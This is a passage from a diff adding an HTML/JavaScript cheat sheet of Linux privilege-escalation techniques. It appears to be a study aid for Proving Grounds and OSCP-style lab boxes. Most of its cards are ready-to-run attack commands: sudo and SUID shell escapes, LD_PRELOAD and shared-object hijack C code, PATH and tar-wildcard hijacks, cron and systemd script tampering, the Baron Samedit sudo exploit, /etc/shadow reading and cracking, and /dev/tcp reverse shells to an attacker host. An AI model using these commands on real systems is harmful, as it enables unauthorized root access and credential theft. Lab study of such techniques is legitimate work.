+        <text class="node-sub" x="974" y="198">overwrite SUID</text></a>
+      <a href="#card-overlayfs"><rect class="node-rect abuse" x="878" y="215" width="192" height="42"/>
+        <text class="node-text" x="974" y="235">OverlayFS Ubuntu</text>
+        <text class="node-sub" x="974" y="248">CVE-2021-3493</text></a>
+      <a href="#card-writable-passwd"><rect class="node-rect abuse" x="878" y="265" width="192" height="42"/>
+        <text class="node-text" x="974" y="285">/etc/passwd writable</text>
+        <text class="node-sub" x="974" y="298">add root2 user</text></a>
+      <a href="#card-nfs-no-root-squash"><rect class="node-rect abuse" x="878" y="315" width="192" height="42"/>
+        <text class="node-text" x="974" y="335">NFS no_root_squash</text>
+        <text class="node-sub" x="974" y="348">plant SUID</text></a>
+      <a href="#card-python-lib-hijack"><rect class="node-rect abuse" x="878" y="365" width="192" height="42"/>
+        <text class="node-text" x="974" y="385">python lib hijack</text>
+        <text class="node-sub" x="974" y="398"><tspan fill="#5fd49b">PG #28 Sona</tspan></text></a>
+
+      <text class="label" x="550" y="450" style="font-size:10px; fill:#5fd49b">⚑ first sudo/suid hit ≠ the right answer — finish enum before exploiting</text>
+    </svg>
+  </div>
+</section>
+
+<section id="cards" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ALL ]</span>
+      <span class="flow-title">TRIGGER CARDS · SEARCHABLE</span>
+    </div>
+    <div class="flow-trigger"><strong>⌘K</strong> search · click diagram to jump · <span class="pg-tag">PG #</span> = your walkthrough</div>
+  </div>
+
+  <div class="filters">
+    <span class="filter-label">FILTER:</span>
+    <button class="pill active" data-filter="all">ALL <span class="pill-count" id="count-all">0</span></button>
+    <button class="pill" data-filter="enum">ENUM <span class="pill-count" id="count-enum">0</span></button>
+    <button class="pill" data-filter="abuse">EXPLOIT <span class="pill-count" id="count-abuse">0</span></button>
+    <button class="pill" data-filter="win">WIN <span class="pill-count" id="count-win">0</span></button>
+  </div>
+  <div id="results"></div>
+</section>
+
+<section id="anti" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ⚠ ]</span>
+      <span class="flow-title" style="color:var(--warn)">ANTI-PATTERNS</span>
+    </div>
+  </div>
+  <div class="anti-list">
+    <div class="anti"><div class="anti-bad">linpeas crashes → "guess I will skip enum"</div><div class="anti-fix">Run the manual checklist by hand: <code>sudo -l</code>, <code>find / -perm -4000</code>, <code>getcap -r /</code>, <code>cat /etc/crontab</code>, <code>id</code>, <code>ls -la /etc/passwd</code>. 10 minutes, no excuses.</div></div>
+    <div class="anti"><div class="anti-bad">Kernel exploit on first try → kernel panic → reset box</div><div class="anti-fix">Kernel exploits are LAST resort. Sudo, SUID, cron, groups, writables — all of those first. PG/exam boxes intentionally include misconfigs to avoid kernel exploits.</div></div>
+    <div class="anti"><div class="anti-bad">sudo -l prompts for password → assume no sudo</div><div class="anti-fix">Try the user pwd if you have it. Try blank. Try common reuse pwds from elsewhere. Many boxes need creds discovery before sudo -l reveals anything.</div></div>
+    <div class="anti"><div class="anti-bad">SUID found → GTFOBins has no entry → give up</div><div class="anti-fix">Unknown SUID = potential goldmine. <code>strings &lt;bin&gt;</code>, <code>ltrace &lt;bin&gt;</code>, <code>strace -f -e openat &lt;bin&gt;</code>. Look for relative paths (PATH hijack) or system() calls.</div></div>
+    <div class="anti"><div class="anti-bad">Edit cron script, wait 5 min, nothing happens</div><div class="anti-fix">Check the schedule. <code>* * * * *</code> = every min. <code>/15 * * * *</code> = xx:00/15/30/45. Also: did you make it executable?</div></div>
+    <div class="anti"><div class="anti-bad">Got root once via kernel exploit, try same on every box</div><div class="anti-fix">Kernel exploits are version-specific. Always check <code>uname -r</code> + <code>cat /etc/os-release</code> first. Wrong kernel = panic.</div></div>
+    <div class="anti"><div class="anti-bad">Skip /etc/passwd check because "obviously not writable"</div><div class="anti-fix">PG Fail proved it. <code>ls -la /etc/passwd</code> takes 1 second. If writable: openssl passwd → root2 line → su. Easiest privesc on the planet.</div></div>
+    <div class="anti"><div class="anti-bad">Find creds in config file, no clear use → ignore</div><div class="anti-fix">Every cred goes through <code>su &lt;every user&gt;</code> first. People reuse passwords for everything. PG Apex / Plum / Fired all hinged on this.</div></div>
+    <div class="anti"><div class="anti-bad">"Box only has SSH and HTTP, must be web exploitation"</div><div class="anti-fix">Once you are in via web, the privesc surface is the WHOLE machine. Run pspy. Check 127.0.0.1 ports. Check service account.</div></div>
+    <div class="anti"><div class="anti-bad">pspy shows root cron but you cannot write the script</div><div class="anti-fix">Check the PATH usage. Check writable dir with wildcards. Check sourced files. Indirect write paths are how PG Muddy worked.</div></div>
+  </div>
+</section>
+
+<div class="foot-info">
+  <div>KEY → <code>⌘/Ctrl+K</code> search · <code>ESC</code> clear · hover commands to copy · click diagram nodes to jump</div>
+  <div style="margin-top:8px">phases: <span style="color:var(--enum)">ENUM</span> · <span style="color:var(--abuse)">EXPLOIT</span> · <span style="color:var(--win)">WIN</span></div>
+  <div style="margin-top:8px; opacity:0.6">v1 · linux privesc · companion to windows-privesc-pattern-bank · PG-grounded</div>
+</div>
+
+</main>
+
+<script>
+const patterns = [
+  { id: 'linpeas-run', phase: 'enum', tags: [], title: 'linpeas + LES — automated baseline',
+    triggers: ['linpeas', 'les', 'enum baseline', 'automated', 'linux-exploit-suggester'],
+    action: 'linpeas runs in background while you do manual sweep. Output is long — pay attention to red (potentially exploitable) and yellow (interesting).',
+    cmd: `# Transfer
+# Kali:
+python3 -m http.server 8000
+
+# Victim:
+cd /tmp
+wget http://<KALI>:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a -P <userpwd> | tee /tmp/lp.out
+
+# Or one-liner
+curl http://<KALI>:8000/linpeas.sh | bash
+
+# LES
+wget http://<KALI>:8000/les.sh
+chmod +x les.sh
+./les.sh
+
+# pspy64 live process watch
+wget http://<KALI>:8000/pspy64
+chmod +x pspy64
+./pspy64 &`,
+    cleanup: 'rm /tmp/linpeas.sh /tmp/les.sh /tmp/pspy64 /tmp/lp.out'
+  },
+  { id: 'sudo-l-check', phase: 'enum', tags: [], title: 'sudo -l · GTFOBins for every entry',
+    triggers: ['sudo', 'sudo -l', 'gtfobins', 'nopasswd', 'env_keep'],
+    action: 'Try blank pwd first, then user pwd, then any other pwd. NOPASSWD = free wins. env_keep with LD_PRELOAD/LD_LIBRARY_PATH is its own card.',
+    cmd: `# Try without pwd
+sudo -l
+
+# With user pwd
+sudo -l
+
+# With another cred
+echo '<pwd>' | sudo -S -l
+
+# For each entry — gtfobins lookup:
+# https://gtfobins.github.io/gtfobins/<binary>/#sudo
+
+# Red flags in output:
+# (ALL) NOPASSWD: /usr/bin/<thing>    → blank-pwd win
+# env_keep+=LD_PRELOAD                 → LD_PRELOAD card
+# env_keep+=LD_LIBRARY_PATH            → LD_LIBRARY card
+# (root) /path/to/script.sh            → writable check
+# (root) /usr/bin/<binary> *           → wildcard inject
+# (root) NOPASSWD: ALL                 → sudo su -`,
+    cleanup: ''
+  },
+  { id: 'suid-find', phase: 'enum', tags: [], title: 'find SUID/SGID + diff vs baseline',
+    triggers: ['suid', 'sgid', 'perm 4000', 'find suid', 'setuid bit'],
+    action: 'Standard find catches all. Compare against baseline (sudo, mount, su, ping, passwd, chsh, chfn, gpasswd, newgrp, umount) — any others are interesting.',
+    cmd: `# All SUID
+find / -perm -4000 -type f 2>/dev/null
+# All SGID
+find / -perm -2000 -type f 2>/dev/null
+# Both
+find / -perm /6000 -type f 2>/dev/null
+
+# Expected baseline (Debian/Ubuntu) — anything else is interesting:
+#   /usr/bin/passwd, chsh, chfn, gpasswd, newgrp, su, sudo, mount, umount
+#   /usr/lib/openssh/ssh-keysign, /usr/lib/dbus*, /usr/lib/polkit*
+#   /bin/ping, /bin/su, /bin/mount, /bin/umount
+
+# For non-baseline SUID:
+# 1. https://gtfobins.github.io/
+# 2. file <bin> · strings <bin>
+# 3. ltrace <bin> · strace -f -e openat <bin>`,
+    cleanup: ''
+  },
+  { id: 'capabilities-find', phase: 'enum', tags: [], title: 'getcap -r / · capability hunt',
+    triggers: ['capabilities', 'getcap', 'cap_setuid', 'cap_dac_read'],
+    action: 'Caps are SUID younger cousin — easy to miss. cap_setuid+ep on python/perl = trivial root. cap_dac_read on tar/cat = read /etc/shadow.',
+    cmd: `# Full sweep
+getcap -r / 2>/dev/null
+
+# Dangerous capabilities:
+# cap_setuid                 → setuid(0) in language runtime
+# cap_dac_read_search        → read any file (shadow)
+# cap_sys_admin              → near-root
+# cap_sys_ptrace             → debug processes
+# cap_chown                  → chown anything
+
+# Example (cap_setuid on python3):
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`,
+    cleanup: ''
+  },
+  { id: 'cron-enum', phase: 'enum', tags: [], title: 'Cron / timers / pspy — scheduled tasks',
+    triggers: ['cron', 'crontab', 'systemd timers', 'pspy', 'scheduled tasks'],
+    action: 'Static crontab first, then systemd timers, then pspy for dynamic tasks. pspy catches root jobs you cannot read.',
+    cmd: `# Static
+cat /etc/crontab
+ls -la /etc/cron.d/ /etc/cron.daily /etc/cron.hourly /etc/cron.weekly
+for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null; done
+
+# Systemd timers
+systemctl list-timers --all
+
+# Dynamic
+./pspy64 -p -f -i 1000
+# -p print commands · -f file events · -i 1000ms
+
+# For each script in cron:
+ls -la <script>           # writable?
+cat <script>              # relative paths? wildcards?
+echo $PATH                 # cron PATH typically /usr/bin:/bin only`,
+    cleanup: ''
+  },
+  { id: 'group-membership', phase: 'enum', tags: [], title: 'id + /etc/group — dangerous groups',
+    triggers: ['id', 'groups', 'group membership', '/etc/group'],
+    action: 'Some groups grant near-root: docker, lxd/lxc, disk, adm, sudo, wheel. Membership = exploit path.',
+    cmd: `# Your groups
+id
+# uid=1000(user) gid=1000(user) groups=1000(user),27(sudo),998(docker)
+
+# All groups + members
+cat /etc/group | grep -E 'docker|lxd|lxc|disk|adm|sudo|wheel|root'
+
+# Per-group attack:
+# docker  →  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# lxd     →  lxd image import + privileged container
+# disk    →  debugfs /dev/sda1
+# adm     →  cat /var/log/* for creds
+# wheel   →  often sudo (try)`,
+    cleanup: ''
+  },
+  { id: 'cred-hunt-linux', phase: 'enum', tags: [], title: 'Cred hunt — files, history, mail',
+    triggers: ['cred hunt', 'password files', 'config grep', 'bash history', 'var mail'],
+    action: 'Every config file potentially has a DB pwd. Every history file potentially has a typo with pwd. /var/mail per user often has system notifications with creds (PG Plum, Fired).',
+    cmd: `# Config files
+find /var/www /opt /etc -name '*.conf' -o -name '*.config' -o -name '*.cnf' -o -name '*.ini' -o -name '*.yml' -o -name '*.yaml' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|passwd\\|secret\\|pwd' 2>/dev/null
+
+# Targeted grep
+grep -ri 'password\\|passwd' /etc/ 2>/dev/null | grep -v 'Binary'
+grep -ri 'password\\|passwd' /var/www/ 2>/dev/null
+grep -ri 'password\\|passwd' /opt/ 2>/dev/null
+
+# Per-user history
+cat /home/*/.bash_history 2>/dev/null
+cat /home/*/.mysql_history 2>/dev/null
+cat /home/*/.viminfo 2>/dev/null
+
+# Mail (PG Plum / Fired)
+ls -la /var/mail/
+cat /var/mail/*
+
+# SSH keys
+find / -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'authorized_keys' 2>/dev/null
+
+# Backups
+find / -name '*.bak' -o -name '*.old' -o -name '*.backup' -o -name '*~' 2>/dev/null`,
+    cleanup: ''
+  },
+  { id: 'writable-find', phase: 'enum', tags: [], title: 'Writable files/dirs you should not have',
+    triggers: ['writable', 'world writable', 'find writable'],
+    action: 'World-writable dirs let you plant trojans. Writable scripts owned by root → win when run by root.',
+    cmd: `# Writable dirs
+find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/run/user'
+
+# Writable files owned by root
+find / -writable -type f -uid 0 2>/dev/null | grep -vE '^/proc|^/sys'
+
+# World-writable
+find / -perm -o+w -type f 2>/dev/null | grep -vE '^/proc|^/sys'
+
+# High-value targets
+ls -la /etc/passwd        # writable = jackpot
+ls -la /etc/shadow        # readable = john /etc/shadow
+ls -la /etc/sudoers       # writable = add line + sudo su -
+ls -la /etc/crontab       # writable = add root cron
+ls -la /etc/systemd/system/`,
+    cleanup: ''
+  },
+
+  { id: 'sudo-gtfo', phase: 'abuse', tags: [], title: 'sudo GTFOBins — every entry has a lookup',
+    triggers: ['sudo gtfo', 'gtfobins sudo', 'sudo binary'],
+    action: 'For every binary in sudo -l, search GTFOBins. Most have a sudo escape: find, vim, less, awk, sed, perl, python, ruby, env, apt-get, tar.',
+    cmd: `# Top GTFOBins sudo escapes
+
+# find
+sudo find . -exec /bin/sh \\; -quit
+
+# vim / vi
+sudo vim -c ':!/bin/sh'
+
+# less / more
+sudo less /etc/profile
+# inside less: !/bin/sh
+
+# awk
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+# sed
+sudo sed -n '1e exec /bin/sh' /etc/passwd
+
+# perl
+sudo perl -e 'exec "/bin/sh";'
+
+# python
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+# env
+sudo env /bin/sh
+
+# tar (checkpoint trick)
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# apt-get
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# zip
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+# Reference: https://gtfobins.github.io/#+sudo`,
+    cleanup: ''
+  },
+  { id: 'sudo-ld-preload', phase: 'abuse', tags: [], title: 'sudo env_keep LD_PRELOAD → .so injection',
+    triggers: ['ld_preload', 'env_keep ld_preload', 'sudo so', 'shared object'],
+    action: 'If sudo -l shows env_keep+=LD_PRELOAD, you can preload a custom .so when running ANY sudo command, including ones that accept no arguments.',
+    cmd: `# Step 1 — write the .so source
+cat > /tmp/preload.c <<'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash -p");
+}
+EOF
+
+# Step 2 — compile as shared lib
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
+
+# Step 3 — run any sudo-allowed binary with LD_PRELOAD
+sudo LD_PRELOAD=/tmp/preload.so <any-sudo-allowed-binary>
+# e.g. sudo LD_PRELOAD=/tmp/preload.so apache2 restart
+
+# → root bash`,
+    cleanup: 'rm /tmp/preload.c /tmp/preload.so'
+  },
+  { id: 'sudo-ld-library-path', phase: 'abuse', tags: [], title: 'sudo env_keep LD_LIBRARY_PATH → lib hijack',
+    triggers: ['ld_library_path', 'env_keep ld_library', 'library hijack'],
+    action: 'Variant of LD_PRELOAD — when LD_PRELOAD is blacklisted but LD_LIBRARY_PATH is allowed. Build fake libc with a function the target calls.',
+    cmd: `# Step 1 — find libs
+ldd /usr/sbin/apache2
+
+# Step 2 — pick one (e.g. libcrypt.so.1)
+cat > /tmp/library.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+static void hijack() __attribute__((constructor));
+void hijack() {
+    unsetenv("LD_LIBRARY_PATH");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+EOF
+
+# Step 3 — compile to match name
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library.c
+
+# Step 4 — invoke sudo
+sudo LD_LIBRARY_PATH=/tmp <sudo-allowed-binary>`,
+    cleanup: 'rm /tmp/library.c /tmp/libcrypt.so.1'
+  },
+  { id: 'sudo-path-hijack', phase: 'abuse', tags: [], title: 'sudo + relative path → PATH hijack',
+    triggers: ['sudo path hijack', 'relative path sudo', 'sudo script'],
+    action: 'When sudo runs a script that calls binaries without absolute path, drop a fake binary in /tmp + poison PATH.',
+    cmd: `# sudo -l output:
+# (root) NOPASSWD: /opt/backup.sh
+
+# Inspect
+cat /opt/backup.sh
+# #!/bin/bash
+# cat /etc/passwd       <-- relative call
+
+# Plant fake "cat"
+cat > /tmp/cat <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x /tmp/cat
+
+# Run with poisoned PATH
+sudo PATH=/tmp:$PATH /opt/backup.sh
+
+# Now bash has SUID
+/bin/bash -p`,
+    cleanup: 'rm /tmp/cat · chmod -s /bin/bash'
+  },
+  { id: 'sudo-baron-samedit', phase: 'abuse', tags: ['pg28'], title: 'Baron Samedit · sudo CVE-2021-3156 [PG #28 Sona]',
+    triggers: ['baron samedit', 'cve-2021-3156', 'sudo heap', 'sudo 1.8.31', 'sona'],
+    action: 'Sudo <1.9.5p2 heap overflow — no creds needed. Useful when you cannot crack sudo pwd. Sona used this.',
+    cmd: `# Check version
+sudo --version
+# sudo version 1.8.31 → vulnerable
+
+# Quick check (no exploit)
+sudoedit -s '/'
+# "not a regular file" → patched
+# segfault / malloc → VULNERABLE
+
+# Blasty version (most reliable on Ubuntu)
+# Kali:
+git clone https://github.com/blasty/CVE-2021-3156
+cd CVE-2021-3156
+make
+
+# Push to victim
+scp -P <port> blasty-vs-sudo <user>@<IP>:/tmp/
+
+# Victim:
+cd /tmp
+chmod +x blasty-vs-sudo
+./blasty-vs-sudo
+# Pick distro version when prompted
+# → root bash
+
+# Alt: worawit
+git clone https://github.com/worawit/CVE-2021-3156
+python3 exploit_nss.py`,
+    cleanup: 'rm /tmp/blasty-vs-sudo /tmp/libnss_*.so.2'
+  },
+  { id: 'sudo-cve-2019-14287', phase: 'abuse', tags: [], title: 'sudo runas -1 · CVE-2019-14287',
+    triggers: ['cve-2019-14287', 'sudo -u#-1', 'sudo bypass'],
+    action: 'Sudo <1.8.28 — when sudo -l shows you can run as anyone EXCEPT root, -u#-1 evaluates to UID 0.',
+    cmd: `# sudo -l output:
+# (ALL, !root) NOPASSWD: /usr/bin/vim
+#       ^^^^^ can run as anyone except root
+
+# Check version
+sudo --version
+# < 1.8.28 → vulnerable
+
+# Exploit
+sudo -u#-1 /usr/bin/vim -c ':!/bin/sh'
+# or
+sudo -u#4294967295 /usr/bin/vim -c ':!/bin/sh'
+
+# Inside vim: :!/bin/sh → root`,
+    cleanup: ''
+  },
+  { id: 'sudo-script-writable', phase: 'abuse', tags: [], title: 'sudo + writable script → just edit it',
+    triggers: ['sudo writable script', 'edit sudo script'],
+    action: 'sudo -l shows a script you can run with sudo. Check write. If yes, append reverse shell or chmod +s /bin/bash.',
+    cmd: `# sudo -l shows:
+# (root) NOPASSWD: /opt/maintenance.sh
+
+# Check write
+ls -la /opt/maintenance.sh
+# -rwxrwxrwx 1 root root  ← writable
+
+# Method 1 — replace
+echo '#!/bin/bash' > /opt/maintenance.sh
+echo 'chmod +s /bin/bash' >> /opt/maintenance.sh
+
+# Method 2 — append
+echo 'chmod +s /bin/bash' >> /opt/maintenance.sh
+
+# Method 3 — reverse
+echo 'bash -i >& /dev/tcp/<KALI>/4444 0>&1' >> /opt/maintenance.sh
+
+# Run via sudo
+sudo /opt/maintenance.sh
+
+# If +s used:
+/bin/bash -p`,
+    cleanup: 'restore original · chmod -s /bin/bash'
+  },
+  { id: 'apt-get-sudo', phase: 'abuse', tags: ['pg59'], title: 'sudo apt-get / apt → GTFO [PG #59 Press]',
+    triggers: ['apt-get sudo', 'press', 'apt pre-invoke'],
+    action: 'Press: admin allowed sudo apt-get. Pre-Invoke hook = arbitrary command. Classic GTFO.',
+    cmd: `# Confirm
+sudo -l
+# (root) NOPASSWD: /usr/bin/apt-get
+
+# Method 1 (cleanest)
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# Method 2 — pager
+sudo apt-get changelog apt
+# inside pager: !/bin/sh
+
+# Method 3 — apt
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+
+# Reference: PG #59 Press`,
+    cleanup: ''
+  },
+
+  { id: 'suid-gtfo', phase: 'abuse', tags: ['pg26'], title: 'SUID GTFOBins · standard binaries [PG #26 QuackerJack]',
+    triggers: ['suid gtfo', 'suid escape', 'gtfobins suid', 'quackerjack'],
+    action: 'Common SUID escapes. Different from sudo — SUID-context payloads. QuackerJack used SUID find.',
+    cmd: `# Top SUID escapes
+
+# find  (PG QuackerJack)
+/usr/bin/find . -exec /bin/sh -p \\; -quit
+
+# nmap (old)
+nmap --interactive
+# nmap> !sh
+
+# vim
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+# less / more
+less /etc/profile
+# inside: !/bin/sh -p
+
+# bash (rare SUID)
+bash -p
+
+# python
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh -p")'
+
+# perl
+perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh -p";'
+
+# env
+env /bin/sh -p
+
+# cp - overwrite passwd
+cp /tmp/passwd /etc/passwd
+
+# Reference: https://gtfobins.github.io/#+suid`,
+    cleanup: ''
+  },
+  { id: 'suid-unknown', phase: 'abuse', tags: [], title: 'SUID unknown — strings/strace/ltrace',
+    triggers: ['unknown suid', 'custom suid', 'strings', 'strace', 'ltrace'],
+    action: 'No GTFOBins entry = analyze. Look for relative paths (PATH hijack), system() calls (cmd injection), readable strings.',
+    cmd: `# Hunt strings
+strings <bin>
+strings -e l <bin>      # 16-bit LE
+strings -e b <bin>      # 16-bit BE
+
+# Library calls
+ltrace <bin>
+ltrace <bin> 2>&1 | grep -E 'system|exec|popen|getenv'
+
+# Syscalls — what files?
+strace -f -e openat <bin> 2>&1 | head -50
+strace -f -e openat,execve <bin>
+
+# Looking for: relative paths in output → PATH hijack
+# e.g. openat(AT_FDCWD, "config.txt", ...)  ← rel path
+
+# system() with relative bin → PATH hijack:
+# Plant fake in /tmp, PATH=/tmp:$PATH <suid-bin>
+
+# Decompile hard cases
+ghidra <bin>
+radare2 <bin>
+# r2: aaa; afl; pdf @main`,
+    cleanup: ''
+  },
+  { id: 'suid-shared-object', phase: 'abuse', tags: [], title: 'SUID + writable .so → shared-object injection',
+    triggers: ['shared object', '.so inject', 'suid library'],
+    action: 'SUID binary loads .so from writable location. Recompile with same name → executed as root.',
+    cmd: `# Find libs
+ldd /path/to/suid-bin
+# Look for libs in writable locations
+
+# Confirm load path
+strace -f -e openat /path/to/suid-bin 2>&1 | grep '\\.so'
+
+# When writable .so location found:
+# Step 1 — hijack source
+cat > /tmp/hijack.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+void __attribute__((constructor)) init() {
+    setuid(0); setgid(0);
+    system("/bin/bash -p");
+}
+EOF
+
+# Step 2 — compile to match target lib name
+gcc -shared -fPIC -nostartfiles -o /writable/path/libtarget.so /tmp/hijack.c
+
+# Step 3 — run SUID bin
+/path/to/suid-bin
+# → root shell`,
+    cleanup: 'rm injected .so · rm /tmp/hijack.c'
+  },
+  { id: 'cap-setuid', phase: 'abuse', tags: [], title: 'cap_setuid+ep on python/perl/ruby',
+    triggers: ['cap_setuid', 'capability setuid', 'os.setuid'],
+    action: 'Language runtime with cap_setuid+ep can call setuid(0) without being root. Trivial.',
+    cmd: `# Detect
+getcap -r / 2>/dev/null | grep cap_setuid
+
+# Example:
+# /usr/bin/python3.8 = cap_setuid+ep
+
+# Exploit (python)
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# Perl
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+# Ruby
+/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
+
+# Node
+/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",[],{stdio:[0,1,2]})'`,
+    cleanup: ''
+  },
+  { id: 'cap-dac-read', phase: 'abuse', tags: [], title: 'cap_dac_read_search → read /etc/shadow',
+    triggers: ['cap_dac_read', 'read shadow capability'],
+    action: 'cap_dac_read_search bypasses read perms. Read /etc/shadow → crack → su.',
+    cmd: `# Detect
+getcap -r / 2>/dev/null | grep dac_read
+
+# Example: /usr/bin/tar = cap_dac_read_search+ep
+
+# Read /etc/shadow via tar
+/usr/bin/tar -cf shadow.tar /etc/shadow
+tar -xf shadow.tar
+cat etc/shadow
+
+# Or cat with capability
+/usr/bin/cat /etc/shadow > /tmp/shadow.txt
+cat /tmp/shadow.txt
+
+# Crack on Kali
+unshadow /tmp/passwd /tmp/shadow > unshadowed
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed`,
+    cleanup: 'rm /tmp/shadow.txt shadow.tar'
+  },
+  { id: 'suid-python', phase: 'abuse', tags: ['pg20'], title: 'SUID python/perl interpreter [PG #20 Levram]',
+    triggers: ['suid python', 'suid perl', 'levram'],
+    action: 'Levram: python3.10 set SUID. Direct os.setuid(0). Same primitive as cap_setuid but via mode bit.',
+    cmd: `# Check
+ls -la /usr/bin/python*
+# -rwsr-xr-x ... python3.10    ← s = SUID
+
+# Exploit
+/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
+
+# Verify
+# uid=0(root)
+
+# Same primitive for:
+# perl: /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/sh";'
+# php:  /usr/bin/php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
+# node: /usr/bin/node -e 'process.setuid(0); require("child_process").execSync("/bin/sh",{stdio:[0,1,2]})'
+
+# Reference: PG #20 Levram`,
+    cleanup: ''
+  },
+
+  { id: 'cron-writable-script', phase: 'abuse', tags: ['pg56'], title: 'Cron writable script — edit + wait [PG #56 Law]',
+    triggers: ['cron writable', 'cleanup script', 'law'],
+    action: 'Cron task references script you can write. Append payload, wait one cycle. Law was literally this (cleanup.sh).',
+    cmd: `# Find via pspy / crontab
+cat /etc/crontab
+
+# Confirm
+ls -la /opt/cleanup.sh
+# -rwxrwxrwx  root root  ← writable
+
+# Method 1 — chmod +s (cleanest)
+echo 'chmod +s /bin/bash' >> /opt/cleanup.sh
+# wait cron cycle
+/bin/bash -p
+# uid=1000 euid=0(root)
+
+# Method 2 — reverse
+echo 'bash -i >& /dev/tcp/<KALI>/4444 0>&1' >> /opt/cleanup.sh
+# nc -lvnp 4444 on Kali
+
+# Method 3 — add root2
+# Generate hash: openssl passwd -1 -salt x mypwd
+echo 'echo "root2:\\$1\\$x\\$xxx:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /opt/cleanup.sh
+# wait, then su root2
+
+# Reference: PG #56 Law`,
+    cleanup: 'remove appended lines · chmod -s /bin/bash'
+  },
+  { id: 'cron-path-hijack', phase: 'abuse', tags: ['pg2'], title: 'Cron PATH hijack [PG #2 muddy]',
+    triggers: ['cron path', 'path hijack', 'muddy'],
+    action: 'Cron script calls command without absolute path. PATH in cron is short. Plant fake binary in writable PATH dir.',
+    cmd: `# Find via pspy + cat
+cat /etc/crontab
+# PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin     <-- /home/user/bin in PATH!
+# * * * * * root /opt/backup.sh
+
+cat /opt/backup.sh
+# #!/bin/bash
+# overlayfs                  ← relative call
+
+# Plant fake binary
+mkdir -p /home/user/bin
+cat > /home/user/bin/overlayfs <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x /home/user/bin/overlayfs
+
+# Wait
+sleep 60
+
+# Use SUID bash
+/bin/bash -p
+
+# Reference: PG #2 muddy`,
+    cleanup: 'rm /home/user/bin/overlayfs · chmod -s /bin/bash'
+  },
+  { id: 'cron-wildcard', phase: 'abuse', tags: ['pg25'], title: 'Cron wildcard (tar/chown) [PG #25 Readys]',
+    triggers: ['cron wildcard', 'tar wildcard', 'readys', 'cockpit'],
+    action: 'Script uses `tar *` or `chown -R *` in writable dir. Create file named --checkpoint=1 and --checkpoint-action=exec=sh shell.sh.',
+    cmd: `# Cron script:
+# cd /opt/backup && tar -czf backup.tar.gz *
+
+# In /opt/backup/:
+cd /opt/backup
+cat > shell.sh <<'EOF'
+#!/bin/bash
+chmod +s /bin/bash
+EOF
+chmod +x shell.sh
+
+# Wildcard-poisoning files
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+
+# Wait
+sleep 65
+/bin/bash -p
+
+# Other wildcard primitives:
+# chown root:root *     →  symlink injection
+# rsync *               →  rsync option injection (-e ssh)
+# zip *                 →  zip --unzip-command='sh -c id'
+
+# Reference: PG #25 Readys (also Cockpit, Slort)`,
+    cleanup: 'rm /opt/backup/--checkpoint=* /opt/backup/shell.sh · chmod -s /bin/bash'
+  },
+  { id: 'service-writable', phase: 'abuse', tags: ['pg38'], title: 'Writable .service unit [PG #38 Hetemit]',
+    triggers: ['writable service', '.service file', 'systemd unit', 'hetemit', 'spider society'],
+    action: 'Hetemit + Spider Society: you can write to .service file → modify ExecStart → sudo systemctl restart triggers payload.',
+    cmd: `# Find writable units
+find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' -writable 2>/dev/null
+
+# Or by hand
+ls -la /etc/systemd/system/*.service
+
+# Confirm sudo can restart
+sudo -l
+# (root) NOPASSWD: /bin/systemctl restart <svc>
+
+# Modify
+nano /etc/systemd/system/<svc>.service
+# [Service]
+# Type=simple
+# ExecStart=/bin/bash -c 'chmod +s /bin/bash'
+
+# Reload + restart
+sudo systemctl daemon-reload    # may not be allowed
+sudo systemctl restart <svc>
+
+# If +s used:
+/bin/bash -p
+
+# Reference: PG #38 Hetemit, PG #69 Spider Society`,
+    cleanup: 'restore ExecStart · chmod -s /bin/bash'
+  },
+  { id: 'systemd-suid', phase: 'abuse', tags: ['pg60'], title: 'sudo systemctl pager [PG #60 Scrutiny]',
